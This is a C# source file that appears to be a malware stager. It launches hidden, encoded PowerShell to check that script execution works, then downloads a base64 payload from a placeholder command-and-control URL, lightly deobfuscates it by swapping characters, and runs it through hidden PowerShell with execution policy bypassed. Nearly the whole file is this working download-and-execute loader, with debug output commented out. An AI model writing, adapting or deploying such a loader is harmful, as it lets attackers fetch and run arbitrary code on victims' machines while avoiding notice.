using System;
using System.IO;
using System.Threading;
using System.Net;

internal class MainApp
{

    public static void Main()
    {

        //encoded ps command to create test file "testfile1.txt" in the %temp% path
        _ = System.Diagnostics.Process.Start("powershell.exe", " -noP -sta -w 1 -exec unrestricted -enc JABhAD0AKABnAGUAdAAtAGkAdABlAG0AIABlAG4AdgA6AHQAZQBtAHAAKQAuAHYAYQBsAHUAZQA7AE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAYQAgAC0ATgBhAG0AZQAgACIAdABlAHMAdABmAGkAbABlADEALgB0AHgAdAAiACAALQBJAHQAZQBtAFQAeQBwAGUAIAAiAGYAaQBsAGUAIgAgAC0AVgBhAGwAdQBlACAAIgBUAGgAaQBzACAAaQBzACAAYQAgAHQAZQB4AHQAIABzAHQAcgBpAG4AZwAuACIA");

        //give the powershell command time to create the file
        Thread.Sleep(500);

        string v = Environment.GetEnvironmentVariable("temp");
        string tempPath = v;
        string curFile = tempPath + @"\testfile1.txt";

        //check if powershell works
        if (File.Exists(curFile))
            KindLily();
        else
        {
            //Console.WriteLine("File does not exist.");
        }

        //Console.WriteLine("Press enter key to continue");
        //Console.ReadLine();

    }

    private static void KindLily()
    {

        //Console.WriteLine("<C2 URL hosting a base64 encoded payload as a .txt file.>");
        WebRequest request = WebRequest.Create("c2domain.com/c2/b64encodedpayload.txt");
        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        //Console.WriteLine (response.StatusDescription);
        Stream dataStream = response.GetResponseStream();
        StreamReader reader = new StreamReader(dataStream);
        string responseFromServer = reader.ReadToEnd();
        responseFromServer = responseFromServer.Replace("%", "W");
        //Console.WriteLine (responseFromServer);
        System.Diagnostics.Process.Start("powershell.exe", " -noP -sta -w 1 -exec unrestricted -enc " + responseFromServer);
        reader.Close();
        dataStream.Close();
        response.Close();
    }
}
